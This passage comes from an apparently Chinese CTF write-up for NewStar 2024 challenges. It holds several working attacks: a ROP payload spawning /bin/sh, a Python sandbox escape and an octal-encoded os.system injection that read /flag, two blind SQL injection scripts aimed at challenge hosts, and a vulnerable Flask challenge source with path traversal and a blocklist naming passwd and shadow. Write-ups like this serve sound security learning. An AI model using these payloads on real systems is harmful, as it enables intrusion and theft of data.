class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(binsh))<br>payload2 = <span class="hljs-string">b&quot;\x00&quot;</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(ret) + p64(rdi) + p64(binsh) + p64(sys)<br><br><br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../images/Newstar/2024/31.png" alt="31"></p><h1 id="week3"><a class="markdownIt-Anchor" href="#week3"></a> week3</h1><h2 id="web-3"><a class="markdownIt-Anchor" href="#web-3"></a> Web</h2><h3 id="include-me"><a class="markdownIt-Anchor" href="#include-me"></a> Include Me</h3><p>简单的伪协议绕过</p><h3 id="臭皮踩踩背"><a class="markdownIt-Anchor" href="#臭皮踩踩背"></a> 臭皮踩踩背</h3><p>这方面学的不多，先试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">(<span class="hljs-number">1</span>).__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()<br></code></pre></td></tr></table></figure><p>当前环境中的 <code>__subclasses__()</code> 返回了许多类，有点类似ssti的过程，试试132可以</p><p>最后构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">(<span class="hljs-number">1</span>).__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p><img src="/../../images/Newstar/2024/37.png" alt="37"></p><h3 id="臭皮的计算机"><a class="markdownIt-Anchor" href="#臭皮的计算机"></a> 臭皮的计算机</h3><p>一开始在想异或或者条件竞争，回宿舍突然灵机一动想出来了</p><p>八进制进行转化</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\163\171\163\164\145\155\050\047\143\141\164\040\057\146\154\141\147\047\051<br></code></pre></td></tr></table></figure><p>对应的语句是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="blindsql1复现"><a class="markdownIt-Anchor" href="#blindsql1复现"></a> blindsql1(复现)</h3><p>一直在等官p，我想到的时间盲注一直注不出来，想拿到官p分析一下，先上我的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>dicts = string.ascii_letters+<span class="hljs-string">&quot;_&quot;</span>+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span><br><span class="hljs-comment">#dicts = &#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://eci-2ze6bhm7y89n414z4qi0.cloudeci1.ichunqiu.com/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = <span class="hljs-string">f&quot;-1&#x27;||(if(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),<span class="hljs-subst">&#123;index&#125;</span>,1)like(&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;),sleep(0.5),0))#&quot;</span><br>         <span class="hljs-comment"># 库名是students_courses_secrets</span><br>        <span class="hljs-comment">#payload = f&quot;-1&#x27;||(if(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(736563726574735F636F75727365735F73747564656E7473))),&#123;index&#125;,1)like(&#x27;&#123;char&#125;&#x27;),sleep(0.5),0))#&quot;</span><br><br>        params = &#123;<span class="hljs-string">&#x27;student_name&#x27;</span>: payload&#125;<br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.get(url=url, params=params)<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>上一下官p吧方法其实类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests,string,time<br><br>url = <span class="hljs-string">&#x27;http://eci-2ze6bhm7y89omu7vsmgr.cloudeci1.ichunqiu.com/&#x27;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] Bruting at <span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">&#x27;,_-&#123;&#125;&#x27;</span>:<br>        time.sleep(<span class="hljs-number">0.01</span>) <span class="hljs-comment"># 限制速率，防止请求过快</span><br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Trying:&#x27;</span>, c)<br><br>        tables = <span class="hljs-string">f&#x27;(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\&#x27;flag%\&#x27;)))&#x27;</span><br><br>        char = <span class="hljs-string">f&#x27;(ord(mid(<span class="hljs-subst">&#123;tables&#125;</span>,<span class="hljs-subst">&#123;i&#125;</span>,1)))&#x27;</span><br><br>        <span class="hljs-comment"># 爆破该 ascii 值</span><br>        b = <span class="hljs-string">f&#x27;((<span class="hljs-subst">&#123;char&#125;</span>)in(<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(c)&#125;</span>))&#x27;</span><br><br>        <span class="hljs-comment"># 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据</span><br>        p = <span class="hljs-string">f&#x27;Alice\&#x27;and(<span class="hljs-subst">&#123;b&#125;</span>)#&#x27;</span><br><br>        res = requests.get(url, params=&#123;<span class="hljs-string">&#x27;student_name&#x27;</span>: p&#125;)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Alice&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]bingo:&#x27;</span>,c)<br>            result += c<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>具体我的代码讲解可以看sql2的我的写法</p><h3 id="这照片是你吗复现"><a class="markdownIt-Anchor" href="#这照片是你吗复现"></a> 这“照片”是你吗(复现)</h3><p>写这题的时候完全没思路，基础功底太差了，跟着官p复现一下，先看源码的hint</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&lt;!-- 图标能够正常显示耶! --&gt;<br>&lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;<br>&lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;<br>&lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;<br></code></pre></td></tr></table></figure><p>能获取路由但是没有中间件来支持，服务端处理文件和路由的逻辑很有可能会有漏洞。wappalyzer可以发现是<code>flask</code>的框架，测试了一下是用目录穿越的漏洞的</p><p><img src="/../../images/Newstar/2024/49.png" alt="49"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, make_response, render_template_string, request, redirect, send_file<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> get_random_number_string<br><br>base_key = <span class="hljs-built_in">str</span>(uuid.uuid4()).split(<span class="hljs-string">&quot;-&quot;</span>)<br>secret_key = get_random_number_string(<span class="hljs-number">6</span>)<br>admin_pass = <span class="hljs-string">&quot;&quot;</span>.join([ _ <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> base_key])<br><br><span class="hljs-built_in">print</span>(admin_pass)<br><br>app = Flask(__name__)<br>failure_count = <span class="hljs-number">0</span><br><br>users = &#123;<br>    <span class="hljs-string">&#x27;admin&#x27;</span>: admin_pass,<br>    <span class="hljs-string">&#x27;amiya&#x27;</span>: <span class="hljs-string">&quot;114514&quot;</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_token</span>(<span class="hljs-params">token</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">global</span> failure_count<br>        <span class="hljs-keyword">if</span> failure_count &gt;= <span class="hljs-number">100</span>:<br>            <span class="hljs-keyword">return</span> make_response(<span class="hljs-string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="hljs-number">403</span>)<br>        data = jwt.decode(token, secret_key, algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>])<br>        <span class="hljs-keyword">if</span> data.get(<span class="hljs-string">&#x27;user&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            failure_count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> make_response(<span class="hljs-string">&quot;You are not admin!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="hljs-number">403</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> make_response(<span class="hljs-string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="hljs-number">401</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/home&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    <span class="hljs-keyword">global</span> failure_count<br>    <span class="hljs-keyword">if</span> failure_count &gt;= <span class="hljs-number">100</span>:<br>        <span class="hljs-keyword">return</span> make_response(<span class="hljs-string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="hljs-number">403</span>)<br>    <span class="hljs-keyword">if</span> users.get(username)==password:<br>        token = jwt.encode(&#123;<span class="hljs-string">&#x27;user&#x27;</span>: username, <span class="hljs-string">&#x27;exp&#x27;</span>: <span class="hljs-built_in">int</span>(time.time()) + <span class="hljs-number">600</span>&#125;, secret_key)<br>        response = make_response(<span class="hljs-string">&#x27;Login success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)<br>        response.set_cookie(<span class="hljs-string">&#x27;token&#x27;</span>, token)<br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-keyword">else</span>:<br>        failure_count += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> make_response(<span class="hljs-string">&#x27;Could not verify!&lt;br&gt;&lt;img src=&quot;/3.png&quot;&gt;&#x27;</span>, <span class="hljs-number">401</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    response = make_response(<span class="hljs-string">&#x27;Logout success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)<br>    response.set_cookie(<span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, expires=<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/home&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    logged_in = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">try</span>:<br>        token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>        data = jwt.decode(token, secret_key, algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>])<br>        text = <span class="hljs-string">&quot;Hello, %s!&quot;</span> % data.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        logged_in = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span>:<br>        logged_in = <span class="hljs-literal">False</span><br>        text = <span class="hljs-string">&quot;You have not logged in!&quot;</span><br>        data = &#123;&#125;<br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">r&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">        &lt;html&gt;</span><br><span class="hljs-string">        &lt;head&gt;</span><br><span class="hljs-string">            &lt;title&gt;Home Page&lt;/title&gt;</span><br><span class="hljs-string">        &lt;/head&gt;</span><br><span class="hljs-string">        &lt;body&gt;</span><br><span class="hljs-string">            &lt;!-- 图标能够正常显示耶! --&gt;</span><br><span class="hljs-string">            &lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;</span><br><span class="hljs-string">            &lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;</span><br><span class="hljs-string">            &lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;</span><br><span class="hljs-string">            &#123;&#123; text &#125;&#125;&lt;br&gt;</span><br><span class="hljs-string">            &#123;% if logged_in %&#125;</span><br><span class="hljs-string">            &lt;a href=&quot;/logout&quot;&gt;登出&lt;/a&gt;</span><br><span class="hljs-string">            &#123;% else %&#125;</span><br><span class="hljs-string">            &lt;h2&gt;登录&lt;/h2&gt;</span><br><span class="hljs-string">            &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-string">                用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">                密码: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;</span><br><span class="hljs-string">            &lt;/form&gt;</span><br><span class="hljs-string">            &#123;% endif %&#125;</span><br><span class="hljs-string">            &lt;br&gt;</span><br><span class="hljs-string">            &#123;% if user==&quot;admin&quot; %&#125;</span><br><span class="hljs-string">            &lt;a href=&quot;/admin&quot;&gt;Go to admin panel&lt;/a&gt;</span><br><span class="hljs-string">            &lt;img src=&quot;/2.png&quot;&gt;</span><br><span class="hljs-string">            &#123;% else %&#125;</span><br><span class="hljs-string">            &lt;img src=&quot;/1.png&quot;&gt;</span><br><span class="hljs-string">            &#123;% endif %&#125;</span><br><span class="hljs-string">        &lt;/body&gt;</span><br><span class="hljs-string">        &lt;/html&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, text=text, logged_in=logged_in, user=data.get(<span class="hljs-string">&#x27;user&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    <span class="hljs-keyword">try</span>:<br>        token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>        <span class="hljs-keyword">if</span> verify_token(token) != <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> verify_token(token)<br>        resp_text = render_template_string(<span class="hljs-string">r&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            &lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">            &lt;html&gt;</span><br><span class="hljs-string">            &lt;head&gt;</span><br><span class="hljs-string">                &lt;title&gt;Admin Panel&lt;/title&gt;</span><br><span class="hljs-string">            &lt;/head&gt;</span><br><span class="hljs-string">            &lt;body&gt;</span><br><span class="hljs-string">                &lt;h1&gt;Admin Panel&lt;/h1&gt;</span><br><span class="hljs-string">                &lt;p&gt;GET Server Info from api:&lt;/p&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;input&quot; value=&#123;&#123;api_url&#125;&#125; id=&quot;api&quot; readonly&gt;</span><br><span class="hljs-string">                &lt;button onclick=execute()&gt;Execute&lt;/button&gt;</span><br><span class="hljs-string">                &lt;script&gt;</span><br><span class="hljs-string">                    function execute() &#123;</span><br><span class="hljs-string">                        fetch(&quot;&#123;&#123;url&#125;&#125;/execute?api_address=&quot;+document.getElementById(&quot;api&quot;).value,</span><br><span class="hljs-string">                                      &#123;credentials: &quot;include&quot;&#125;</span><br><span class="hljs-string">                                      ).then(res =&gt; res.text()).then(data =&gt; &#123;</span><br><span class="hljs-string">                            document.write(data);</span><br><span class="hljs-string">                        &#125;);</span><br><span class="hljs-string">                    &#125;</span><br><span class="hljs-string">                &lt;/script&gt;</span><br><span class="hljs-string">            &lt;/body&gt;</span><br><span class="hljs-string">            &lt;/html&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>, api_url=request.host_url+<span class="hljs-string">&quot;/api&quot;</span>, url=request.host_url)<br>        resp = make_response(resp_text)<br>        resp.headers[<span class="hljs-string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="hljs-string">&#x27;true&#x27;</span><br>        <span class="hljs-keyword">return</span> resp<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> make_response(<span class="hljs-string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="hljs-number">401</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/execute&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>():<br>    token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> verify_token(token) != <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">return</span> verify_token(token)<br>    api_address = request.args.get(<span class="hljs-string">&quot;api_address&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> api_address:<br>        <span class="hljs-keyword">return</span> make_response(<span class="hljs-string">&quot;No api address!&quot;</span>, <span class="hljs-number">400</span>)<br>    response = requests.get(api_address, cookies=&#123;<span class="hljs-string">&#x27;token&#x27;</span>: token&#125;)<br>    <span class="hljs-keyword">return</span> response.text<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/api&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">api</span>():<br>    token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> verify_token(token) != <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">return</span> verify_token(token)<br>    resp = make_response(<span class="hljs-string">f&quot;Server Info: <span class="hljs-subst">&#123;os.popen(<span class="hljs-string">&#x27;uname -a&#x27;</span>).read()&#125;</span>&quot;</span>)<br>    resp.headers[<span class="hljs-string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="hljs-string">&#x27;true&#x27;</span><br>    <span class="hljs-keyword">return</span> resp<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&lt;path:file&gt;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">static_file</span>(<span class="hljs-params">file</span>):<br>    <span class="hljs-built_in">print</span>(file)<br>    restricted_keywords = [<span class="hljs-string">&quot;proc&quot;</span>, <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-string">&quot;shadow&quot;</span>, <span class="hljs-string">&quot;hosts&quot;</span>, <span class="hljs-string">&quot;sys&quot;</span>, <span class="hljs-string">&quot;log&quot;</span>, <span class="hljs-string">&quot;etc&quot;</span>, <br>                           <span class="hljs-string">&quot;bin&quot;</span>, <span class="hljs-string">&quot;lib&quot;</span>, <span class="hljs-string">&quot;tmp&quot;</span>, <span class="hljs-string">&quot;var&quot;</span>, <span class="hljs-string">&quot;run&quot;</span>, <span class="hljs-string">&quot;dev&quot;</span>, <span class="hljs-string">&quot;home&quot;</span>, <span class="hljs-string">&quot;boot&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(keyword <span class="hljs-keyword">in</span> file <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> restricted_keywords):<br>        <span class="hljs-keyword">return</span> make_response(<span class="hljs-string">&quot;STOP!&quot;</span>, <span class="hljs-number">404</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&quot;./static/&quot;</span> + file):<br>        <span class="hljs-keyword">return</span> make_response(<span class="hljs-string">&quot;Not found!&quot;</span>, <span class="hljs-number">404</span>)<br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&quot;./static/&quot;</span> + file)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>简单的审计一下代码</p><p>密码的登陆是uuid</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">base_key = <span class="hljs-built_in">str</span>(uuid.uuid4()).split(<span class="hljs-string">&quot;-&quot;</span>)<br>secret_key = get_random_number_string(<span class="hljs-number">6</span>)<br>admin_pass = <span class="hljs-string">&quot;&quot;</span>.join([ _ <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> base_key])<br></code></pre></td></tr></table></figure><p>同时限制了登录次数,所以不能直接fuzz爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> failure_count &gt;= <span class="hljs-number">100</span>:<br>            <span class="hljs-keyword">return</span> make_response(<span 